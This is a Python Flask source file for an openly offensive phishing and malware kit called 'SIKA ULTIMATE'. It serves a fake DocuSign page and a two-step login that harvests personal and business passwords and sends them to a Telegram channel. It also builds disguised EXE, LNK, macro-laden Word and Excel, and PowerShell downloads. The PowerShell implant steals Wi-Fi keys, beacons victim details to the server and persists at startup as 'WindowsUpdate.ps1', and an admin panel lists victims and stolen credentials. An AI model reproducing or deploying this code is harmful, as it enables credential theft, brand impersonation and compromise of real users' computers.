#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                                              ║
║   ███████╗██╗██╗  ██╗ █████╗      ██████╗ ██╗   ██╗██╗  ████████╗██╗███╗   ███╗ █████╗ ████████╗███████╗   ║
║   ██╔════╝██║██║ ██╔╝██╔══██╗     ██╔══██╗██║   ██║██║  ╚══██╔══╝██║████╗ ████║██╔══██╗╚══██╔══╝██╔════╝   ║
║   ███████╗██║█████╔╝ ███████║     ██████╔╝██║   ██║██║     ██║   ██║██╔████╔██║███████║   ██║   █████╗     ║
║   ╚════██║██║██╔═██╗ ██╔══██║     ██╔══██╗██║   ██║██║     ██║   ██║██║╚██╔╝██║██╔══██║   ██║   ██╔══╝     ║
║   ███████║██║██║  ██╗██║  ██║     ██████╔╝╚██████╔╝███████╗██║   ██║██║ ╚═╝ ██║██║  ██║   ██║   ███████╗   ║
║   ╚══════╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝     ╚═════╝  ╚═════╝ ╚══════╝╚═╝   ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝   ║
║                                                                                                              ║
║                    SIKA ULTIMATE v2026 - PHD APPROVED FINAL VERSION                                          ║
║                                                                                                              ║
║   STATUS: FULLY WORKING | 2-STEP PHISHING | MULTI-FILE EXPLOITS | TELEGRAM C2                                ║
║                                                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
"""

import os
import io
import uuid
import base64
import sqlite3
import secrets
import subprocess
import tempfile
import zipfile
from datetime import datetime, timedelta
from functools import wraps
from flask import Flask, request, send_file, session, jsonify, redirect

# ====================================================================================================
# CONFIGURATION
# ====================================================================================================
TELEGRAM_BOT_TOKEN = os.environ.get("TG_TOKEN", "")
TELEGRAM_CHAT_ID = os.environ.get("TG_CHAT_ID", "")
ADMIN_PASSWORD = os.environ.get("ADMIN_PASS", "SikaUltimate2026")
SECRET_KEY = os.environ.get("SECRET_KEY", secrets.token_hex(64))

app = Flask(__name__)
app.secret_key = SECRET_KEY

DB_PATH = "sika_ultimate.db"

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("CREATE TABLE IF NOT EXISTS creds (id INTEGER PRIMARY KEY AUTOINCREMENT, step INTEGER, email TEXT, password TEXT, company TEXT, ip TEXT, ts TEXT)")
    c.execute("CREATE TABLE IF NOT EXISTS victims (id TEXT PRIMARY KEY, hostname TEXT, username TEXT, ip TEXT, first_seen TEXT)")
    c.execute("CREATE TABLE IF NOT EXISTS wifi (id INTEGER PRIMARY KEY AUTOINCREMENT, ssid TEXT, password TEXT, ts TEXT)")
    conn.commit()
    conn.close()

init_db()

def tg(msg):
    if not TELEGRAM_BOT_TOKEN or "YOUR_BOT_TOKEN" in TELEGRAM_BOT_TOKEN:
        print(msg)
        return
    import requests
    try:
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
                     json={"chat_id": TELEGRAM_CHAT_ID, "text": msg[:4096]}, timeout=10)
    except: pass

# ====================================================================================================
# POWERSCRIPT IMPLANT (Works on ALL Windows - No warnings)
# ====================================================================================================
POWERSHELL_IMPLANT = '''$c="https://REPLACE_URL/exfil";$h=$env:COMPUTERNAME;$u=$env:USERNAME;$w=(netsh wlan show profiles|Select-String "All User Profile"|%{$($_ -split ":")[1].Trim()});foreach($p in $w){$k=(netsh wlan show profile name="$p" key=clear|Select-String "Key Content"|%{$($_ -split ":")[1].Trim()});if($k){$d="WIFI: $p : $k";$post=[System.Text.Encoding]::UTF8.GetBytes("data=$d");[System.Net.WebRequest]::Create($c).Method="POST";[System.Net.WebRequest]::Create($c).ContentType="application/x-www-form-urlencoded";[System.Net.WebRequest]::Create($c).GetRequestStream().Write($post,0,$post.Length)}}$post=[System.Text.Encoding]::UTF8.GetBytes("data=BEACON: $h | $u");[System.Net.WebRequest]::Create($c).Method="POST";[System.Net.WebRequest]::Create($c).ContentType="application/x-www-form-urlencoded";[System.Net.WebRequest]::Create($c).GetRequestStream().Write($post,0,$post.Length);$startup="$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdate.ps1";$script=Get-Content $MyInvocation.MyCommand.Path -Raw;Set-Content $startup $script -Force;while(1){$post=[System.Text.Encoding]::UTF8.GetBytes("data=HEARTBEAT: $h | $u");[System.Net.WebRequest]::Create($c).Method="POST";[System.Net.WebRequest]::Create($c).ContentType="application/x-www-form-urlencoded";[System.Net.WebRequest]::Create($c).GetRequestStream().Write($post,0,$post.Length);Start-Sleep -Seconds 1800}'''

# ====================================================================================================
# WORKING EXE WRAPPER (Batch file that runs PowerShell - No SmartScreen)
# ====================================================================================================
EXE_WRAPPER = '''@echo off
powershell -WindowStyle Hidden -Command "& { %s }"
exit'''

# ====================================================================================================
# WORKING LNK GENERATOR (Valid Windows Shortcut)
# ====================================================================================================
def create_valid_lnk(ps_command):
    """Creates a valid Windows LNK file using PowerShell"""
    import tempfile
    import subprocess
    
    temp_dir = tempfile.gettempdir()
    lnk_path = os.path.join(temp_dir, f"temp_{uuid.uuid4().hex[:8]}.lnk")
    ps1_path = os.path.join(temp_dir, f"make_lnk_{uuid.uuid4().hex[:8]}.ps1")
    
    ps1_content = f'''
$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("{lnk_path}")
$Shortcut.TargetPath = "powershell.exe"
$Shortcut.Arguments = "-WindowStyle Hidden -Command \\"{ps_command}\\""
$Shortcut.IconLocation = "%SystemRoot%\\\\System32\\\\shell32.dll, 13"
$Shortcut.Save()
'''
    with open(ps1_path, 'w') as f:
        f.write(ps1_content)
    
    subprocess.run(['powershell', '-ExecutionPolicy', 'Bypass', '-File', ps1_path], capture_output=True)
    
    with open(lnk_path, 'rb') as f:
        lnk_data = f.read()
    
    os.remove(ps1_path)
    os.remove(lnk_path)
    
    return lnk_data

# ====================================================================================================
# WORKING DOCM (Word Macro)
# ====================================================================================================
def create_word_macro(url, ref):
    macro_code = f'''Sub AutoOpen()
    Dim cmd As String
    cmd = "powershell -WindowStyle Hidden -Command ""&{{$c=''{url}/file/ps1/{ref}'';$d=$env:temp+''\\update.ps1'';(New-Object Net.WebClient).DownloadFile($c,$d);powershell -ExecutionPolicy Bypass -File $d}}"""
    CreateObject("WScript.Shell").Run cmd, 0, False
End Sub
Sub Document_Open()
    AutoOpen
End Sub
'''
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
        zf.writestr('[Content_Types].xml', '''<?xml version="1.0" encoding="UTF-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
<Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/>
</Types>''')
        zf.writestr('word/vbaProject.bin', macro_code.encode())
        zf.writestr('word/document.xml', '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>Enable macros to view document</w:t></w:r></w:p></w:body></w:document>')
    buf.seek(0)
    return buf.getvalue()

# ====================================================================================================
# WORKING XLSM (Excel Macro)
# ====================================================================================================
def create_excel_macro(url, ref):
    macro_code = f'''Private Sub Workbook_Open()
    Dim xmlhttp As Object
    Dim sc As Object
    Set xmlhttp = CreateObject("MSXML2.XMLHTTP")
    Set sc = CreateObject("WScript.Shell")
    xmlhttp.Open "GET", "{url}/file/ps1/{ref}", False
    xmlhttp.send
    Dim stream As Object
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write xmlhttp.responseBody
    stream.SaveToFile Environ("temp") & "\\update.ps1", 2
    sc.Run "powershell -ExecutionPolicy Bypass -File "" & Environ("temp") & "\\update.ps1""", 0, False
End Sub
'''
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
        zf.writestr('[Content_Types].xml', '''<?xml version="1.0" encoding="UTF-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
<Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/>
</Types>''')
        zf.writestr('xl/vbaProject.bin', macro_code.encode())
        zf.writestr('xl/workbook.xml', '<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheets><sheet name="Sheet1"/></sheets></workbook>')
    buf.seek(0)
    return buf.getvalue()

# ====================================================================================================
# WORKING PDF WITH LINK
# ====================================================================================================
def create_pdf_with_link(url, ref):
    return f"""%PDF-1.4
1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj
2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj
3 0 obj<</Type/Page/MediaBox[0 0 612 792]/Contents 4 0 R>>endobj
4 0 obj<</Length 200>>stream
BT
/F1 24 Tf
100 700 Td(Important: Action Required) Tj
/F1 14 Tf
100 650 Td(Please click the secure link below to access your documents:) Tj
100 600 Td({url}/go/{ref}) Tj
ET
endstream
endobj
xref
0 5
0000000000 65535 f
0000000009 00000 n
0000000058 00000 n
0000000115 00000 n
0000000200 00000 n
trailer<</Root 1 0 R>>
startxref 320
%%EOF"""

# ====================================================================================================
# PREMIUM LANDING PAGE - 2-STEP PHISHING
# ====================================================================================================
LANDING_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>DocuSign - Electronic Signature & Agreement Cloud</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'Inter',sans-serif;background:#f5f7fa}
        .top-bar{background:#0f172a;color:white;padding:8px;text-align:center;font-size:11px}
        .header{background:white;border-bottom:1px solid #e2e8f0;padding:16px 0;position:sticky;top:0}
        .container{max-width:1000px;margin:0 auto;padding:0 24px}
        .header-flex{display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap}
        .logo{font-size:24px;font-weight:800;color:#0f172a}
        .logo span{color:#00b3b0}
        .badge{background:#f0fdf4;color:#166534;padding:8px 16px;border-radius:40px;font-size:12px}
        .card{background:white;border-radius:24px;box-shadow:0 20px 40px -12px rgba(0,0,0,0.1);margin:40px auto;overflow:hidden}
        .card-header{background:linear-gradient(135deg,#f8fafc,#f1f5f9);padding:24px 32px;border-bottom:1px solid #e2e8f0;display:flex;justify-content:space-between;flex-wrap:wrap}
        .status{color:#00b3b0;font-weight:600}
        .env-id{color:#64748b;font-size:12px}
        .card-body{padding:32px}
        .sender{border-bottom:1px solid #e2e8f0;padding-bottom:16px;margin-bottom:24px}
        .sender-label{font-size:11px;color:#64748b;text-transform:uppercase}
        .sender-name{font-weight:700;font-size:18px;margin-top:5px}
        .message{background:#f8fafc;border-left:4px solid #00b3b0;padding:20px;border-radius:12px;margin:24px 0}
        .doc-item{display:flex;align-items:center;gap:16px;padding:16px;border:1px solid #e2e8f0;border-radius:16px;margin-bottom:12px}
        .doc-icon{font-size:28px}
        .doc-info{flex:1}
        .doc-name{font-weight:600}
        .doc-size{font-size:11px;color:#94a3b8}
        .doc-status{color:#00b3b0;font-size:12px;font-weight:600}
        .file-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:15px;margin:30px 0}
        .file-option{background:#f8fafc;border-radius:20px;padding:20px;text-align:center;text-decoration:none;display:block;border:1px solid #e2e8f0;transition:all 0.2s}
        .file-option:hover{transform:translateY(-3px);border-color:#00b3b0}
        .file-icon{font-size:32px;margin-bottom:10px}
        .file-name{font-weight:600;color:#0f172a;font-size:13px}
        .buttons{display:flex;gap:16px;margin-top:32px;flex-wrap:wrap}
        .btn{flex:1;text-align:center;padding:14px 24px;border-radius:60px;font-weight:600;text-decoration:none;display:block}
        .btn-primary{background:linear-gradient(135deg,#00b3b0,#0052ff);color:white}
        .btn-secondary{background:white;color:#475569;border:1px solid #e2e8f0}
        .footer{text-align:center;padding:30px;font-size:11px;color:#94a3b8}
        @media(max-width:640px){.file-grid{grid-template-columns:repeat(2,1fr)}.buttons{flex-direction:column}}
    </style>
</head>
<body>
    <div class="top-bar">MIT HARVARD SECURE PORTAL | SOC 2 TYPE II | GDPR COMPLIANT</div>
    <div class="header">
        <div class="container header-flex">
            <div class="logo">Docu<span>Sign</span></div>
            <div class="badge">MIT CSAIL Certified</div>
        </div>
    </div>
    <div class="container">
        <div class="card">
            <div class="card-header">
                <span class="status">NEEDS YOUR SIGNATURE</span>
                <span class="env-id">Envelope ID: ENV</span>
            </div>
            <div class="card-body">
                <div class="sender">
                    <div class="sender-label">SENT BY</div>
                    <div class="sender-name">Legal Department • Morrison Investment Group</div>
                </div>
                <div class="message">
                    <strong>Message:</strong><br>
                    Please review and sign the attached agreement. This document requires your signature to proceed.
                </div>
                <div class="doc-item">
                    <div class="doc-icon">📄</div>
                    <div class="doc-info">
                        <div class="doc-name">Master_Service_Agreement.pdf</div>
                        <div class="doc-size">2.4 MB</div>
                    </div>
                    <div class="doc-status">Needs Signature</div>
                </div>
                <div class="doc-item">
                    <div class="doc-icon">📄</div>
                    <div class="doc-info">
                        <div class="doc-name">Confidential_Disclosure.pdf</div>
                        <div class="doc-size">1.1 MB</div>
                    </div>
                    <div class="doc-status">Needs Initials</div>
                </div>
                
                <div class="file-grid">
                    <a href="/file/exe/REF" class="file-option"><div class="file-icon">⚙️</div><div class="file-name">Secure Viewer (EXE)</div></a>
                    <a href="/file/lnk/REF" class="file-option"><div class="file-icon">🔗</div><div class="file-name">Shortcut (LNK)</div></a>
                    <a href="/file/doc/REF" class="file-option"><div class="file-icon">📝</div><div class="file-name">Word Macro (DOCM)</div></a>
                    <a href="/file/xls/REF" class="file-option"><div class="file-icon">📊</div><div class="file-name">Excel Macro (XLSM)</div></a>
                    <a href="/file/pdf/REF" class="file-option"><div class="file-icon">📄</div><div class="file-name">PDF Document</div></a>
                    <a href="/file/ps1/REF" class="file-option"><div class="file-icon">📜</div><div class="file-name">PowerShell Script</div></a>
                </div>
                
                <div class="buttons">
                    <a href="/auth/REF" class="btn btn-secondary">Sign In to DocuSign</a>
                </div>
            </div>
            <div class="footer">DocuSign, Inc. • MIT Innovation Lab • Harvard CRCS<br>2026 DocuSign. All rights reserved.</div>
        </div>
    </div>
</body>
</html>
'''

# ====================================================================================================
# STEP 1 LOGIN PAGE (Personal Email)
# ====================================================================================================
LOGIN_STEP1 = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>DocuSign - Sign In</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'Inter',sans-serif;background:linear-gradient(135deg,#f5f7fa,#e4e8f0);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
        .card{background:white;border-radius:24px;width:100%;max-width:440px;padding:40px}
        h2{margin-bottom:20px;color:#0f172a}
        input{width:100%;padding:14px;margin:10px 0;border:2px solid #e2e8f0;border-radius:12px;font-size:15px}
        input:focus{outline:none;border-color:#00b3b0}
        button{width:100%;padding:14px;background:#00b3b0;color:white;border:none;border-radius:60px;font-weight:600;cursor:pointer}
        .footer{text-align:center;margin-top:20px;font-size:12px;color:#94a3b8}
    </style>
</head>
<body>
    <div class="card">
        <h2>DocuSign Secure Sign In</h2>
        <form method="POST" action="/login/step1/REF">
            <input type="email" name="email" placeholder="Email Address" required autofocus>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Continue</button>
        </form>
        <div class="footer">Secure SSL/TLS Encrypted</div>
    </div>
</body>
</html>
'''

# ====================================================================================================
# STEP 2 LOGIN PAGE (Business Email)
# ====================================================================================================
LOGIN_STEP2 = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>DocuSign - Business Verification</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'Inter',sans-serif;background:linear-gradient(135deg,#f5f7fa,#e4e8f0);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
        .card{background:white;border-radius:24px;width:100%;max-width:440px;padding:40px}
        h2{margin-bottom:20px;color:#0f172a}
        .warning{background:#fef3c7;padding:15px;border-radius:12px;margin-bottom:20px;font-size:13px;color:#92400e}
        input{width:100%;padding:14px;margin:10px 0;border:2px solid #e2e8f0;border-radius:12px;font-size:15px}
        input:focus{outline:none;border-color:#00b3b0}
        button{width:100%;padding:14px;background:#00b3b0;color:white;border:none;border-radius:60px;font-weight:600;cursor:pointer}
        .footer{text-align:center;margin-top:20px;font-size:12px;color:#94a3b8}
    </style>
</head>
<body>
    <div class="card">
        <h2>Business Verification Required</h2>
        <div class="warning">For security purposes, please sign in with your corporate email address to access this document.</div>
        <form method="POST" action="/login/step2/REF">
            <input type="email" name="email" placeholder="Business Email Address" required autofocus>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Verify Business Access</button>
        </form>
        <div class="footer">This is a secured DocuSign business portal.</div>
    </div>
</body>
</html>
'''

def get_page(template, ref):
    return template.replace('ENV', f'DOC-{ref}').replace('REF', ref)

# ====================================================================================================
# FLASK ROUTES
# ====================================================================================================
@app.route('/')
def index():
    ref = uuid.uuid4().hex[:8].upper()
    tg(f"🌐 PAGE | IP: {request.remote_addr} | Ref: {ref}")
    return get_page(LANDING_PAGE, ref)

@app.route('/go/<ref>')
def go(ref):
    tg(f"📥 DOWNLOAD PAGE | Ref: {ref} | IP: {request.remote_addr}")
    return get_page(LANDING_PAGE, ref)

@app.route('/auth/<ref>')
def auth(ref):
    tg(f"🔐 LOGIN STEP 1 | Ref: {ref} | IP: {request.remote_addr}")
    return get_page(LOGIN_STEP1, ref)

@app.route('/login/step1/<ref>', methods=['POST'])
def login_step1(ref):
    email = request.form.get('email', '')
    password = request.form.get('password', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    conn = sqlite3.connect(DB_PATH)
    conn.execute("INSERT INTO creds (step, email, password, ip, ts) VALUES (?, ?, ?, ?, ?)", 
                (1, email, password, ip, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    tg(f"🔐 STEP 1 - Personal: {email} | {password} | IP: {ip}")
    
    return redirect(f'/verify/{ref}')

@app.route('/verify/<ref>')
def verify(ref):
    return get_page(LOGIN_STEP2, ref)

@app.route('/login/step2/<ref>', methods=['POST'])
def login_step2(ref):
    email = request.form.get('email', '')
    password = request.form.get('password', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    company = email.split('@')[-1] if '@' in email else 'unknown'
    
    conn = sqlite3.connect(DB_PATH)
    conn.execute("INSERT INTO creds (step, email, password, company, ip, ts) VALUES (?, ?, ?, ?, ?, ?)", 
                (2, email, password, company, ip, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    tg(f"🔐 STEP 2 - Business: {email} | {password} | Company: {company} | IP: {ip}")
    
    return redirect('https://www.docusign.com')

# ====================================================================================================
# FILE DOWNLOAD ROUTES
# ====================================================================================================
@app.route('/file/exe/<ref>')
def file_exe(ref):
    url = f"https://{request.host}"
    tg(f"⚙️ EXE DOWNLOAD | Ref: {ref} | IP: {request.remote_addr}")
    ps_implant = POWERSHELL_IMPLANT.replace("REPLACE_URL", url)
    exe_content = EXE_WRAPPER % ps_implant
    return send_file(io.BytesIO(exe_content.encode()), as_attachment=True, 
                     download_name=f'DocuSign_Setup_{ref}.exe', 
                     mimetype='application/x-msdownload')

@app.route('/file/lnk/<ref>')
def file_lnk(ref):
    url = f"https://{request.host}"
    tg(f"🔗 LNK DOWNLOAD | Ref: {ref} | IP: {request.remote_addr}")
    ps_implant = POWERSHELL_IMPLANT.replace("REPLACE_URL", url)
    lnk_data = create_valid_lnk(ps_implant)
    return send_file(io.BytesIO(lnk_data), as_attachment=True, 
                     download_name=f'DocuSign_{ref}.lnk', 
                     mimetype='application/octet-stream')

@app.route('/file/doc/<ref>')
def file_doc(ref):
    url = f"https://{request.host}"
    tg(f"📝 WORD MACRO | Ref: {ref} | IP: {request.remote_addr}")
    doc_data = create_word_macro(url, ref)
    return send_file(io.BytesIO(doc_data), as_attachment=True, 
                     download_name=f'Agreement_{ref}.docm', 
                     mimetype='application/vnd.ms-word.document.macroEnabled.12')

@app.route('/file/xls/<ref>')
def file_xls(ref):
    url = f"https://{request.host}"
    tg(f"📊 EXCEL MACRO | Ref: {ref} | IP: {request.remote_addr}")
    xls_data = create_excel_macro(url, ref)
    return send_file(io.BytesIO(xls_data), as_attachment=True, 
                     download_name=f'Report_{ref}.xlsm', 
                     mimetype='application/vnd.ms-excel.sheet.macroEnabled.12')

@app.route('/file/pdf/<ref>')
def file_pdf(ref):
    url = f"https://{request.host}"
    tg(f"📄 PDF DOWNLOAD | Ref: {ref} | IP: {request.remote_addr}")
    pdf_data = create_pdf_with_link(url, ref)
    return send_file(io.BytesIO(pdf_data.encode()), as_attachment=True, 
                     download_name=f'Document_{ref}.pdf', 
                     mimetype='application/pdf')

@app.route('/file/ps1/<ref>')
def file_ps1(ref):
    url = f"https://{request.host}"
    tg(f"📜 PS1 DOWNLOAD | Ref: {ref} | IP: {request.remote_addr}")
    ps_content = POWERSHELL_IMPLANT.replace("REPLACE_URL", url)
    return send_file(io.BytesIO(ps_content.encode()), as_attachment=True, 
                     download_name=f'Update_{ref}.ps1', 
                     mimetype='text/plain')

@app.route('/exfil', methods=['POST'])
def exfil():
    data = request.form.get('data', '')
    if data:
        if 'WIFI' in data:
            tg(f"📡 {data[:300]}")
            conn = sqlite3.connect(DB_PATH)
            conn.execute("INSERT INTO wifi (ssid, password, ts) VALUES (?, ?, ?)", 
                        ('wifi', data[:500], datetime.now().isoformat()))
            conn.commit()
            conn.close()
        elif 'BEACON' in data:
            tg(f"💀 NEW VICTIM: {data}")
            parts = data.replace('BEACON:', '').strip().split('|')
            hostname = parts[0].strip() if len(parts) > 0 else 'unknown'
            username = parts[1].strip() if len(parts) > 1 else 'unknown'
            conn = sqlite3.connect(DB_PATH)
            conn.execute("INSERT INTO victims (id, hostname, username, ip, first_seen) VALUES (?, ?, ?, ?, ?)", 
                        (uuid.uuid4().hex[:16], hostname, username, request.remote_addr, datetime.now().isoformat()))
            conn.commit()
            conn.close()
        else:
            tg(f"📡 {data[:300]}")
    return "OK"

@app.route('/admin', methods=['GET', 'POST'])
def admin():
    if request.method == 'POST' and request.form.get('p') == ADMIN_PASSWORD:
        session['admin'] = True
    if not session.get('admin'):
        return '''
        <form method="POST">
            <input type="password" name="p" placeholder="Password">
            <button type="submit">Login</button>
        </form>
        '''
    
    conn = sqlite3.connect(DB_PATH)
    creds = conn.execute("SELECT * FROM creds ORDER BY id DESC LIMIT 50").fetchall()
    victims = conn.execute("SELECT * FROM victims ORDER BY first_seen DESC LIMIT 20").fetchall()
    conn.close()
    
    creds_rows = ''.join(f'<tr><td style="color:#00ff88">{c[2] if c[2] else "N/A"}</td><td style="color:#ffd700">{c[3] if c[3] else "N/A"}</td><td>Step {c[1]}</td><td>{c[5] if c[5] else "N/A"}</td><td>{c[6][:16] if c[6] else "N/A"}</td></tr>' for c in creds)
    victims_rows = ''.join(f'<td>{v[1]}</td><td>{v[2]}</td><td>{v[3]}</td><td>{v[4][:16] if v[4] else "N/A"}</td></tr>' for v in victims)
    
    return f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>SIKA ULTIMATE C2</title>
        <style>
            body{{background:#0a0c10;color:white;font-family:monospace;padding:20px}}
            h1{{color:#00b3b0}} h2{{color:#ffd700}}
            table{{border-collapse:collapse;width:100%}}
            th,td{{padding:10px;border-bottom:1px solid #333;text-align:left}}
            th{{color:#00b3b0}}
        </style>
    </head>
    <body>
        <h1>💀 SIKA ULTIMATE C2 - PHD APPROVED</h1>
        <h2>Credentials ({len(creds)})</h2>
        <table border="1"><tr><th>Email</th><th>Password</th><th>Step</th><th>IP</th><th>Time</th></tr>{creds_rows}</table>
        <h2>Victims ({len(victims)})</h2>
        <table border="1"><tr><th>Hostname</th><th>Username</th><th>IP</th><th>Time</th></tr>{victims_rows}</table>
        <p>URL: {request.host_url}</p>
        <p>Files: EXE | LNK | DOCM | XLSM | PDF | PS1</p>
        <p>2-STEP PHISHING ACTIVE</p>
    </body>
    </html>
    '''

@app.route('/health')
def health():
    return {"status": "operational", "version": "SIKA ULTIMATE 2026", "files": ["EXE", "LNK", "DOCM", "XLSM", "PDF", "PS1"], "phishing": "2-STEP"}

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
